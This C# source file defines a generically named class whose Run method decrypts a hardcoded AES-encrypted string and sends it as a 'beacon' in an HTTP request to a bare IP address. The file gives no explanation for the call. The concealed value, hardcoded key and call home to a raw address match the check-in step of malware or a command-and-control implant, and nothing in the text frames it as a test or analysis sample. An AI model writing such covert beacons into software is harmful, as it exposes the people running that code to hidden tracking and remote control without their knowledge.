using System.Net;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace chk1
{
    public class Class1
    {
        private static string encIV = "PlEnk3YsW0T1Gr43";
        private static string encKey = "JQ07hTr42Vb0T11a";
        private byte[] iv = System.Text.Encoding.Default.GetBytes(encIV);
        private byte[] key = System.Text.Encoding.Default.GetBytes(encKey);
        HttpClient httpClient = new HttpClient();

        public void Run()
        {
            string encryptedBeacon = "8orqRBdYSOuAak3uQvEMRw==";
            string decryptedBeacon = string.Empty;

            try
            {
                decryptedBeacon = DecryptString(encryptedBeacon, key, iv);
                using HttpResponseMessage response = httpClient.GetAsync("http://123.45.67.201/?beacon=" + decryptedBeacon).Result;
                response.EnsureSuccessStatusCode();
                var result = response.Content.ReadAsStringAsync().Result;
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.StackTrace + Environment.NewLine + exc.Message);
            }
        }

        static string DecryptString(string encryptedText, byte[] key, byte[] iv)
        {
            string unencryptedText = null;

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.PKCS7;
                ICryptoTransform decrypt = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(System.Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decrypt, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            unencryptedText = streamReader.ReadToEnd();
                        }
                    }
                }
            }

            return unencryptedText;
        }   
    }
}